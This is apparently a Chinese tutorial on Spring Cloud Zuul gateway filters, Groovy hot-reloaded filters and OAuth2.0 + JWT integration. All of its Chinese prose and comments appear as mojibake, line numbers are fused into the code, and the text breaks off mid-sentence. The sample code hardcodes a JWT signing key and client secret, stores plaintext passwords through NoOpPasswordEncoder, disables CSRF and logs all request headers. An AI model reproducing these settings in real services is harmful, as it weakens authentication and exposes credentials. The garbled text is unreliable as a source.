1234567891011121314151617181920212223242526272829303132import com.netflix.zuul.ZuulFilter;import com.netflix.zuul.exception.ZuulException;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import static org.springframework.cloud.netflix.zuul.filters.support.FilterConstants.PRE_TYPE;public class FirstPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(FirstPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 0; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; first custom zuul filter"); return null; }} 12345678@Configurationpublic class CommonConfiguration { @Bean public FirstPreFilter firstPreFilter() { return new FirstPreFilter(); }} ä¸šåŠ¡å¤„ç†å®æˆ˜Zuul ä½œä¸ºä¸€ä¸ª â€œç½‘å…³â€ ç»„ä»¶ï¼ŒåŸå§‹çš„åŠŸèƒ½å¾€å¾€ä¸èƒ½æ»¡è¶³å®é™…ä¸šåŠ¡éœ€æ±‚ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå®˜æ–¹é¢„ç•™äº† APIï¼Œä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿå®ç°è‡ªå®šä¹‰ä¸šåŠ¡å¤„ç†ï¼ŒåŠ å…¥ Zuul çš„é€»è¾‘æµç¨‹ã€‚ä¸‹é¢æ¨¡æ‹Ÿä¸€ä¸ªä¸šåŠ¡éœ€æ±‚ï¼Œä½¿ç”¨ SecondPreFilter æ¥éªŒè¯æ˜¯å¦ä¼ å…¥ a å‚æ•°ï¼Œä½¿ç”¨ ThirdPreFilter æ¥éªŒè¯æ˜¯å¦ä¼ å…¥ b å‚æ•°ï¼Œæœ€ååœ¨ PostFilter é‡Œè¾¹ç»Ÿä¸€å¤„ç†è¿”å›å†…å®¹ï¼ŒæŸ¥çœ‹æµç¨‹å›¾ ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142public class SecondPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(SecondPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 2; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; second custom zuul pre filter"); //ä»RequestContextè·å–ä¸Šä¸‹æ–‡ RequestContext context = RequestContext.getCurrentContext(); //ä»ä¸Šä¸‹æ–‡è·å–HttpServletRequest HttpServletRequest request = context.getRequest(); //ä»requestå°è¯•è·å–aå‚æ•°å€¼ String a = request.getParameter("a"); if (null == a) { //å¯¹è¯¥è¯·æ±‚ç¦æ­¢è·¯ç”±ï¼Œä¹Ÿå°±æ˜¯ç¦æ­¢è®¿é—®ä¸‹æ¸¸æœåŠ¡ context.setSendZuulResponse(false); //ä¿å­˜äºä¸Šä¸‹æ–‡ï¼Œä½œä¸ºåŒç±»å‹ä¸‹æ¸¸Filterçš„æ‰§è¡Œå¼€å…³ context.set("logic-is-success", false); //è®¾å®šresponseBodyä¾›PostFilterä½¿ç”¨ context.setResponseBody("{\\"status\\":500,\\"message\\":\\"param a is null !\\"}"); return null; } //è®¾ç½®é¿å…æŠ¥ç©ºå¼‚å¸¸ context.set("logic-is-success", true); return null; }} 12345678910111213141516171819202122232425262728293031323334353637383940414243public class ThirdPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(ThirdPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 3; } @Override public boolean shouldFilter() { RequestContext context = RequestContext.getCurrentContext(); return (boolean) context.get("logic-is-success"); } @Override public Object run() throws ZuulException { logger.info("==&gt; third custom zuul pre filter"); //ä»RequestContextè·å–ä¸Šä¸‹æ–‡ RequestContext context = RequestContext.getCurrentContext(); //ä»ä¸Šä¸‹æ–‡è·å–HttpServletRequest HttpServletRequest request = context.getRequest(); //ä»requestå°è¯•è·å–bå‚æ•°å€¼ String b = request.getParameter("b"); if (null == b) { //å¯¹è¯¥è¯·æ±‚ç¦æ­¢è·¯ç”±ï¼Œä¹Ÿå°±æ˜¯ç¦æ­¢è®¿é—®ä¸‹æ¸¸æœåŠ¡ context.setSendZuulResponse(false); //ä¿å­˜äºä¸Šä¸‹æ–‡ï¼Œä½œä¸ºåŒç±»å‹ä¸‹æ¸¸Filterçš„æ‰§è¡Œå¼€å…³ï¼Œå‡å®šåç»­è¿˜æœ‰è‡ªå®šä¹‰Filterå½“è®¾ç½®æ­¤å€¼ context.set("logic-is-success", false); //è®¾å®šresponseBodyä¾›PostFilterä½¿ç”¨ context.setResponseBody("{\\"status\\":500,\\"message\\":\\"param b is null !\\"}"); return null; } //è®¾ç½®é¿å…æŠ¥ç©ºå¼‚å¸¸ context.set("logic-is-success", true); return null; }} 1234567891011121314151617181920212223242526272829303132333435363738public class PostFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(SecondPreFilter.class); @Override public String filterType() { return POST_TYPE; } @Override public int filterOrder() { return 0; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; custom zuul post filter"); //ä»RequestContextè·å–ä¸Šä¸‹æ–‡ RequestContext context = RequestContext.getCurrentContext(); //å¤„ç†è¿”å›ä¸­æ–‡ä¹±ç  context.getResponse().setCharacterEncoding("UTF-8"); //è·å–ä¸Šä¸‹æ–‡ä¸­ä¿å­˜çš„responseBody String responseBody = context.getResponseBody(); //å¦‚æœresponseBodyä¸ä¸ºç©ºï¼Œåˆ™è¯´æ˜æµç¨‹æœ‰å¼‚å¸¸å‘ç”Ÿ if (null != responseBody) { //è®¾å®šè¿”å›çŠ¶æ€ç  context.setResponseStatusCode(500); //æ›¿æ¢å“åº”æŠ¥æ–‡ context.setResponseBody(responseBody); } return null; }} æµ‹è¯•æ•ˆæœï¼š ä¾æ¬¡å¯åŠ¨ eureka-serverã€provider-serviceã€zuul-server åº”ç”¨ è®¿é—® http://127.0.0.1:8092/provider/service/provider/add?b=3ï¼Œæ—¥å¿—è¾“å‡ºå¦‚ä¸‹ï¼š 12SecondPreFilter : ==&gt; second custom zuul pre filterSecondPreFilter : ==&gt; custom zuul post filter è®¿é—® http://127.0.0.1:8092/provider/service/provider/add?a=3ï¼Œæ—¥å¿—è¾“å‡ºå¦‚ä¸‹ï¼š 123SecondPreFilter : ==&gt; second custom zuul pre filterThirdPreFilter : ==&gt; third custom zuul pre filterSecondPreFilter : ==&gt; custom zuul post filter ä½¿ç”¨ Groovy ç¼–å†™ FilterGroovy è¯­è¨€æ˜¯åŸºäº JVM çš„ä¸€é—¨åŠ¨æ€è¯­è¨€ï¼Œå®ƒç»“åˆäº† Pythonã€ Ruby å’Œ Smalltalk çš„è®¸å¤šå¼ºå¤§ç‰¹æ€§ï¼Œæ”¯æŒæ— ç¼å¼•å…¥ Java ä»£ç ä¸ Java åº“ï¼Œå¸¸å¸¸è¢«ç”¨ä½œ Java çš„æ‰©å±•è¯­è¨€æ¥ä½¿ç”¨ã€‚å®ƒçš„è¯­æ³•ä¸ Java ç±»ä¼¼ï¼Œä¹¦å†™èµ·æ¥æ¯” Java ç•¥ä¸ºç®€æ´ï¼Œæ˜¯ä¸€é—¨å¾ˆä¼˜ç§€çš„è¯­è¨€ã€‚Zuul ä¸­æä¾› Groovy çš„ç¼–è¯‘ç±» com.netflix.zuul.groovy.GroovyCompilerï¼Œç»“åˆ com.netflix.zuul.groovy.GroovyFileFilter ç±»ï¼Œå¯ä»¥ä½¿ç”¨ Groovy æ¥ç¼–å†™è‡ªå®šä¹‰çš„ Filterã€‚ä¹Ÿè®¸åˆ°è¿™é‡Œï¼Œå¾ˆå¤šå¼€å‘è€…è®¤ä¸ºå®ƒåœ¨ Zuul ä¸­æ²¡æœ‰å­˜åœ¨çš„å¿…è¦ï¼Œä½†æ˜¯å½“å¾—çŸ¥å®ƒå¯ä»¥ä¸ç”¨ç¼–è¯‘ï¼ˆä¸ç”¨æ‰“è¿›å·¥ç¨‹åŒ…ï¼‰ï¼Œå¯ä»¥æ”¾åœ¨æœåŠ¡å™¨ä¸Šä»»æ„ä½ç½®ï¼Œå¯ä»¥ä»»ä½•æ—¶å€™ä¿®æ”¹ç”±å®ƒç¼–å†™çš„ Filterï¼Œä¸”ä¿®æ”¹è¿‡åè¿˜ä¸ç”¨é‡å¯æœåŠ¡çš„æ—¶å€™ï¼Œå°±ä¼šçŸ¥é“å®ƒæœ‰å¤šå®ç”¨äº†ã€‚ä¸‹é¢ä½¿ç”¨ Groovy ç¼–å†™è‡ªå®šä¹‰ Filter ä½œä¸ºä¾‹å­ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ é¦–å…ˆæ·»åŠ  Groovy ç›¸å…³çš„ä¾èµ–ï¼Œéœ€è¦æŒ‡å®š Groovy çš„ç‰ˆæœ¬æ¥è¦†ç›– SpringBoot ä¸­çš„ Groovy ç‰ˆæœ¬ï¼Œå»ºè®®è¿™é‡Œä¸è¦ä½¿ç”¨é˜¿é‡Œäº‘çš„ Maven ä»“åº“ï¼Œå¦åˆ™ä¼šæ‰¾ä¸åˆ°æœ€æ–°ç‰ˆæœ¬çš„ Groovyï¼š 123456789101112&lt;properties&gt; &lt;groovy.version&gt;3.0.3&lt;/groovy.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt; &lt;artifactId&gt;groovy-all&lt;/artifactId&gt; &lt;version&gt;${groovy.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt;&lt;/dependencies&gt; ä½¿ç”¨ Groovy ç¼–å†™è‡ªå®šä¹‰ Filterï¼Œå¹¶å°† Groovy çš„æºç æ–‡ä»¶ GroovyFilter.groovy ä¿å­˜åœ¨ /tmp/groovy/ ç›®å½•ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738import com.netflix.zuul.ZuulFilterimport com.netflix.zuul.context.RequestContextimport com.netflix.zuul.exception.ZuulExceptionimport javax.servlet.http.HttpServletRequestimport static org.springframework.cloud.netflix.zuul.filters.support.FilterConstants.PRE_TYPEclass GroovyFilter extends ZuulFilter { @Override String filterType() { return PRE_TYPE } @Override int filterOrder() { return 10 } @Override boolean shouldFilter() { return true } @Override Object run() throws ZuulException { println("This is Groovy Filter!") HttpServletRequest request = RequestContext.currentContext.request as HttpServletRequest Iterator headerIt = request.getHeaderNames().iterator() while (headerIt.hasNext()) { String name = (String) headerIt.next() String value = request.getHeader(name) println("header: " + name + ": " + value) } return null }} æ³¨å†Œ GroovyFilter.groovyï¼š 12345678910111213141516@Componentpublic class GroovyRunner implements CommandLineRunner { @Override public void run(String... args) throws Exception { MonitoringHelper.initMocks(); FilterLoader.getInstance().setCompiler(new GroovyCompiler()); try{ FilterFileManager.setFilenameFilter(new GroovyFileFilter()); // æŒ‡å®šGroovyæºç æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œå¯¹è·¯å¾„æ¯éš”20ç§’æ‰«æä¸€æ¬¡ FilterFileManager.init(20, "/tmp/groovy"); }catch(Exception e){ throw new RuntimeException(e); } }} æµ‹è¯•ï¼š ä¾æ¬¡å¯åŠ¨ eureka-serverã€provider-serviceã€zuul-server åº”ç”¨ è®¿é—® http://127.0.0.1:8092/provider/service/provider/add?b=3ï¼Œæ—¥å¿—è¾“å‡ºå¦‚ä¸‹ï¼š 123456This is Groovy Filter!header: host: 127.0.0.1:8092header: connection: keep-aliveheader: cache-control: max-age=0header: upgrade-insecure-requests: 1... å°† /tmp/groovy/GroovyFilter.groovy é‡Œçš„ println("This is Groovy Filter!") æ›´æ”¹ä¸º println("This is Groovy Filter Modify!") ç­‰å¾… 20 ç§’åï¼Œè®¿é—® http://127.0.0.1:8092/provider/service/provider/add?b=3ï¼Œæ—¥å¿—è¾“å‡ºå¦‚ä¸‹ï¼š 123456This is Groovy Filter Modify!header: host: 127.0.0.1:8092header: connection: keep-aliveheader: cache-control: max-age=0header: upgrade-insecure-requests: 1... Zuul æƒé™é›†æˆåº”ç”¨æƒé™æ¦‚è¿°æƒé™ï¼Œæ˜¯æ•´ä¸ªå¾®æœåŠ¡ä½“ç³»ä¹ƒè‡³è½¯ä»¶ä¸šæ°¸æ’çš„è¯é¢˜ï¼Œæœ‰èµ„æºçš„åœ°æ–¹ï¼Œå°±æœ‰æƒé™çº¦æŸã€‚ä»¥å¾€åœ¨æ„å»ºå•ä½“åº”ç”¨çš„æ—¶å€™ï¼Œæ¯”è¾ƒæµè¡Œçš„æ–¹å¼æ˜¯ä½¿ç”¨ Apache Shiroï¼Œå¼€å‘è€…çš„å°è±¡éƒ½æ˜¯ Apache Shiro æ¯” Spring Security ä¸Šæ‰‹å®¹æ˜“ï¼Œå­¦ä¹ æˆæœ¬ç›¸å¯¹è¾ƒå°ï¼Œä½†æ˜¯åˆ°äº† Spring Cloud è¿™é‡Œï¼Œé¢å¯¹æˆåƒä¸Šä¸‡çš„æœåŠ¡ï¼Œè€Œä¸”æœåŠ¡ä¹‹é—´æ— çŠ¶æ€ï¼Œæ­¤æ—¶ Apache Shiro éš¾å…æ˜¾å¾—åŠ›ä¸ä»å¿ƒï¼Œæ‰€ä»¥ Spring Cloud æ²¡æœ‰é€‰æ‹©å®ƒä¹Ÿæ˜¯æœ‰åŸå› çš„ã€‚åœ¨è§£å†³æ–¹æ¡ˆçš„é€‰æ‹©ä¸Šé¢ï¼Œä¼ ç»Ÿçš„è­¬å¦‚å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰ï¼Œæˆ–è€…åˆ†å¸ƒå¼ Sessionï¼Œè¦ä¹ˆè‡´ä½¿æƒé™æœåŠ¡å™¨é›†ä¸­åŒ–å¯¼è‡´æµé‡è‡ƒè‚¿ï¼Œè¦ä¹ˆéœ€è¦å®ç°ä¸€å¥—å¤æ‚çš„å­˜å‚¨åŒæ­¥æœºåˆ¶ï¼Œéƒ½ä¸æ˜¯æœ€å¥½çš„è§£å†³æ–¹æ¡ˆã€‚ä½œä¸º Spring Cloud å¾®æœåŠ¡ä½“ç³»æµé‡å‰é—¨çš„ Zuulï¼Œé™¤å»ä¸å®ƒç‰¹æ€§æ¯«æ— ç›¸å…³çš„å®ç°æ–¹å¼ï¼Œæ¯”è¾ƒå¥½çš„æ–¹å¼æœ‰ï¼š è‡ªå®šä¹‰æƒé™è®¤è¯ Filterç”±äº Zuul å¯¹è¯·æ±‚è½¬å‘å…¨ç¨‹çš„å¯æ§æ€§ï¼Œå¯ä»¥åœ¨ Requestcontext çš„åŸºç¡€ä¸Šåšä»»ä½•äº‹æƒ…ï¼Œä¾‹å¦‚åªéœ€è¦è®¾ç½®ä¸€ä¸ªæ‰§è¡Œé¡ºåºé å‰çš„ Filterï¼Œå°±å¯ä»¥ä¸“é—¨å¯¹è¯·æ±‚çš„ç‰¹å®šå†…å®¹åšæƒé™è®¤è¯ã€‚è¿™ç§æ–¹å¼çš„ä¼˜ç‚¹æ˜¯å®ç°çµæ´»åº¦é«˜ï¼Œå¯æ•´åˆå·²æœ‰æƒé™ç³»ç»Ÿï¼Œå¯¹åŸå§‹ç³»ç»Ÿå¾®æœåŠ¡åŒ–ç‰¹åˆ«å‹å¥½ï¼›ç¼ºç‚¹æ˜¯éœ€è¦å¼€å‘ä¸€å¥—æ–°çš„é€»è¾‘ï¼Œç»´æŠ¤å¢åŠ æˆæœ¬ï¼Œè€Œä¸”ä¹Ÿä¼šä½¿å¾—è°ƒç”¨é“¾è·¯å˜å¾—ç´Šä¹±ã€‚ OAuth2.0 + JWT è®¤è¯OAuth2.0 æ˜¯ä¸šç•Œå¯¹äº â€œæˆæƒ - è®¤è¯â€ æ¯”è¾ƒæˆç†Ÿçš„é¢å‘èµ„æºçš„æˆæƒåè®®ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œé™¤äº†å¯ä»¥ä½¿ç”¨æœ¬ç«™ç”¨æˆ·åä¸å¯†ç ç™»å½• Spring Cloud ä¸­å›½ç¤¾åŒºï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹åº”ç”¨ç™»å½•ï¼Œæ¯”å¦‚ï¼šGitHubã€QQ ç­‰ç™»å½•æ–¹å¼ã€‚ç¬¬ä¸‰æ–¹ç™»å½•åŠŸèƒ½å¯¹ç”¨æˆ·ååˆ†æœ‰äº²å’ŒåŠ›ï¼Œè€Œ Oauth2.0 å°±æ˜¯ç”¨äºå®šä¹‰ Spring Cloud ä¸­å›½ç¤¾åŒºä¸ç”¨æˆ·ä¹‹é—´çš„é‚£ä¸ª â€œæˆæƒå±‚â€ çš„ã€‚Oauth2.0 çš„è®¤è¯åŸç†å›¾å¦‚ä¸‹ï¼Œåœ¨æ•´ä¸ªæµç¨‹ä¸­ï¼Œç”¨æˆ·æ˜¯èµ„æºæ‹¥æœ‰è€…ï¼Œå…¶å…³é”®è¿˜æ˜¯åœ¨äºå®¢æˆ·ç«¯éœ€è¦èµ„æºæ‹¥æœ‰è€…çš„æˆæƒï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ç›¸å½“äºé”®å…¥å¯†ç æˆ–è€…æ˜¯å…¶ä»–ç¬¬ä¸‰æ–¹ç™»å½•ï¼Œè§¦å‘äº†è¿™ä¸ªæ“ä½œä¹‹åï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥å‘æˆæƒæœåŠ¡å™¨ç”³è¯· Tokenï¼Œæ‹¿åˆ°åå†æºå¸¦ Token åˆ°èµ„æºæ‰€åœ¨æœåŠ¡å™¨æ‹‰å–ç›¸åº”èµ„æºã€‚ JWTï¼ˆJSON Web Tokenï¼‰æ˜¯ä¸€ç§ä½¿ç”¨ JSON æ ¼å¼æ¥è§„çº¦ Token æˆ–è€… Session çš„åè®®ã€‚ç”±äºä¼ ç»Ÿè®¤è¯æ–¹å¼å…ä¸äº†ä¼šç”Ÿæˆä¸€ä¸ªå‡­è¯ï¼Œè¿™ä¸ªå‡­è¯å¯ä»¥æ˜¯ Token æˆ–è€… Sessionï¼Œä¿å­˜äºæœåŠ¡ç«¯æˆ–è€…å…¶ä»–æŒä¹…åŒ–å·¥å…·ä¸­ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå‡­è¯çš„å­˜å–å°±å˜å¾—ååˆ†éº»çƒ¦ï¼ŒJWT çš„å‡ºç°æ‰“ç ´äº†è¿™ä¸€ç“¶é¢ˆï¼Œå®ç°äº† â€œå®¢æˆ·ç«¯ Sessionâ€ çš„æ„¿æ™¯ã€‚JWT é€šå¸¸ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š Header å¤´éƒ¨ï¼šæŒ‡å®š JWT ä½¿ç”¨çš„ç­¾åç®—æ³• Payload è½½è·ï¼šåŒ…å«ä¸€äº›è‡ªå®šä¹‰ä¸éè‡ªå®šä¹‰çš„è®¤è¯ä¿¡æ¯ Signature ç­¾åï¼šå°†å¤´éƒ¨ä¸è½½è·ä½¿ç”¨ . è¿æ¥ä¹‹åï¼Œä½¿ç”¨å¤´éƒ¨çš„ç­¾åç®—æ³•ç”Ÿæˆç­¾åä¿¡æ¯å¹¶æ‹¼è£…åˆ°æœ«å°¾ OAuth2.0 + JWT çš„æ„ä¹‰å°±åœ¨äºï¼Œä½¿ç”¨ 0Auth2.0 åè®®çš„æ€æƒ³æ‹‰å–è®¤è¯ç”Ÿæˆ Tokenï¼Œä½¿ç”¨ JWT ç¬æ—¶ä¿å­˜è¿™ä¸ª Tokenï¼Œåœ¨å®¢æˆ·ç«¯ä¸èµ„æºç«¯è¿›è¡Œå¯¹ç§°æˆ–éå¯¹ç§°åŠ å¯†ï¼Œä½¿å¾—è¿™ä¸ªè§„çº¦å…·æœ‰å®šæ—¶ã€å®šé‡çš„æˆæƒè®¤è¯åŠŸèƒ½ï¼Œä»è€Œå…å» Token å­˜å‚¨æ‰€å¸¦æ¥çš„å®‰å…¨æˆ–ç³»ç»Ÿæ‰©å±•é—®é¢˜ã€‚ OAuth2.0 + JWT å®æˆ˜ä¸‹é¢æ¨¡æ‹Ÿ Zuul ç»“åˆ OAuth2.0 + JWT çš„å®é™…åº”ç”¨ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ ç¼–å†™ zuul-serverzuul-server ä¸­éœ€è¦åšçš„å°±æ˜¯å½“è¯·æ±‚æ¥å£æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œå¦‚æœæœªç™»å½•ï¼Œåˆ™è·³è½¬åˆ° auth-server çš„ç™»å½•ç•Œé¢ï¼ˆè¿™é‡Œä½¿ç”¨çš„æ˜¯ Spring Security OAuth çš„é»˜è®¤ç™»å½•ç•Œé¢ï¼Œä¹Ÿå¯ä»¥é‡å†™ç›¸å…³ä»£ç å®šåˆ¶é¡µé¢)ï¼Œç™»å½•æˆåŠŸå auth-server é¢å‘ jwt tokenï¼Œzuul-server åœ¨è®¿é—®ä¸‹æ¸¸æœåŠ¡æ—¶å°† jwt token æ”¾å…¥ header ä¸­å³å¯ã€‚ zuul-server çš„ pom.xml æ–‡ä»¶ï¼š 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt; zuul-server çš„ application.yml æ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930server: port: 8092spring: application: name: zuul-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-servicesecurity: oauth2: client: access-token-uri: http://127.0.0.1:8091/uaa/oauth/token #ä»¤ç‰Œç«¯ç‚¹ user-authorization-uri: http://127.0.0.1:8091/uaa/oauth/authorize #æˆæƒç«¯ç‚¹ client-id: zuul_server #OAuth2å®¢æˆ·ç«¯ID client-secret: secret #OAuth2å®¢æˆ·ç«¯å¯†é’¥ resource: jwt: key-value: springcloud123 #æŒ‡å®šå¯†é’¥ï¼Œä½¿ç”¨å¯¹ç§°åŠ å¯†æ–¹å¼ï¼Œé»˜è®¤ç®—æ³•ä¸ºHS256 åœ¨ zuul-server é‡Œé‡å†™ WebSecurityConfigurerAdapter é€‚é…å™¨çš„ configure(HttpSecurity http) æ–¹æ³•ï¼Œå£°æ˜éœ€è¦é‰´æƒçš„ URL ä¿¡æ¯ 1234567891011121314151617@Component@EnableOAuth2Ssopublic class WebSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http .authorizeRequests() .antMatchers("/login", "/provider/service/**") .permitAll() .anyRequest() .authenticated() .and() .csrf() .disable(); }} ç¼–å†™ auth-serverauth-server æ˜¯æ•´ä¸ªç¤ºä¾‹çš„ å¦ä¸€ä¸ªæ ¸å¿ƒï¼Œä½œä¸ºè®¤è¯æˆæƒä¸­å¿ƒï¼Œç”¨äºé¢å‘ jwt token å‡­è¯ã€‚ auth-server çš„ pom.xml æ–‡ä»¶ï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; auth-server çš„ application.xml æ–‡ä»¶ï¼š 123456789101112131415server: port: 8091 servlet: context-path: /uaaspring: application: name: auth-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true åœ¨ auth-server é‡Œç¼–å†™è®¤è¯æˆæƒæœåŠ¡é€‚é…ç±» OauthConfigruatrionï¼Œä¸»è¦ç”¨äºæŒ‡å®šå®¢æˆ·ç«¯ IDã€å¯†é’¥ï¼Œä»¥åŠæƒé™å®šä¹‰ä¸ä½œç”¨åŸŸå£°æ˜ï¼ŒæŒ‡å®š TokenStore ä¸º JWTï¼Œä¸åŒäºä»¥å¾€å°† TokenStore æŒ‡å®šä¸º Redis æˆ–æ˜¯å…¶ä»–æŒä¹…åŒ–å·¥å…·ï¼š 123456789101112131415161718192021222324252627282930313233343536373839@Configuration@EnableAuthorizationServerpublic class OauthConfigruatrion extends AuthorizationServerConfigurerAdapter { @Autowired private AuthenticationManager authenticationManager; @Override public void configure(ClientDetailsServiceConfigurer clients) throws Exception { clients .inMemory() .withClient("zuul_server") .secret("secret") .scopes("WRIGTH", "read") .autoApprove(true) .authorities("WRIGTH_READ", "WRIGTH_WRITE") .authorizedGrantTypes("implicit", "refresh_token", "password", "authorization_code"); } @Override public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception { endpoints .tokenStore(jwtTokenStore()) .tokenEnhancer(jwtTokenConverter()) .authenticationManager(authenticationManager); } @Bean public TokenStore jwtTokenStore() { return new JwtTokenStore(jwtTokenConverter()); } @Bean protected JwtAccessTokenConverter jwtTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); converter.setSigningKey("springcloud123"); return converter; }} åœ¨ auth-server é‡Œç¼–å†™å®‰å…¨é…ç½®ç±» WebSecurityConfigurationï¼Œä¸»è¦å£°æ˜ç”¨æˆ· admin å…·æœ‰è¯»å†™æƒé™ï¼Œç”¨æˆ· guest å…·æœ‰è¯»æƒé™ï¼ŒpasswordEncoder() ç”¨äºå£°æ˜ç”¨æˆ·åå’Œå¯†ç çš„åŠ å¯†æ–¹å¼ï¼Œè¿™ä¸ªåŠŸèƒ½åœ¨ Spring Security 5.0 ä¹‹å‰æ˜¯æ²¡æœ‰çš„ã€‚ 1234567891011121314151617181920212223@Configurationpublic class WebSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override @Bean(name = BeanIds.AUTHENTICATION_MANAGER) public AuthenticationManager authenticationManager() throws Exception { return super.authenticationManager(); } @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { auth .inMemoryAuthentication() .withUser("guest").password("guest").authorities("WRIGTH_READ") .and() .withUser("admin").password("admin").authorities("WRIGTH_READ", "WRIGTH_WRITE"); } @Bean public static NoOpPasswordEncoder passwordEncoder() { return (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance(); }} ç¼–å†™ provider-serviceprovider-service ä½œä¸º zuul-server çš„ä¸‹æ¸¸æœåŠ¡ï¼Œéœ€è¦çš„åŠŸèƒ½å¾ˆç®€å•ï¼Œèƒ½å¤Ÿè¢«æ³¨å†Œå‘ç°ï¼Œä»¥åŠèƒ½å¤ŸæŒ‰ç…§è§„è´è§£æ jwt token å³å¯ã€‚ provider-service çš„ pom.xml æ–‡ä»¶ 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; provider-service çš„ application.yml æ–‡ä»¶ï¼š 12345678910111213server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true åœ¨ provider-service é‡Œç¼–å†™é…ç½®ç±» ResourceServerConfigurationï¼š 123456789101112131415161718192021222324252627282930313233@Configuration@EnableResourceServerpublic class ResourceServerConfiguration extends ResourceServerConfigurerAdapter { @Override public void configure(HttpSecurity http) throws Exception { http .csrf().disable() .authorizeRequests() .antMatchers("/**").authenticated() .antMatchers(HttpMethod.GET, "/test") .hasAuthority("WRIGTH_READ"); } @Override public void configure(ResourceServerSecurityConfigurer resources) throws Exception { resources .resourceId("WRIGTH") .tokenStore(jwtTokenStore()); } @Bean public TokenStore jwtTokenStore() { return new JwtTokenStore(jwtTokenConverter()); } @Bean protected JwtAccessTokenConverter jwtTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); converter.setSigningKey("springcloud123"); return converter; }} åœ¨ provider-service é‡Œç¼–å†™æµ‹è¯•ç±»ï¼š 1234567891011121314151617@RestControllerpublic class TestController { private static final Logger logger = LoggerFactory.getLogger(TestController.class); @RequestMapping("/test") public String test(HttpServletRequest request) { logger.info("----------------header----------------"); Enumeration headerNames = request.getHeaderNames(); while (headerNames.hasMoreElements()) { String key = (String) headerNames.nextElement(); logger.info(key + ": " + request.getHeader(key)); } logger.info("----------------header----------------"); return "hello!"; }} æµ‹è¯•æ•ˆæœ åœ¨æµ‹è¯•ä¹‹å‰ï¼Œæ•´ä¸ªç¤ºä¾‹çš„æµç¨‹å›¾åœ¨è¿™é‡Œ ä¾æ¬¡å¯åŠ¨ eureka-serverã€provider-serviceã€auth-serverã€zuul-server åº”ç”¨ è®¿é—® 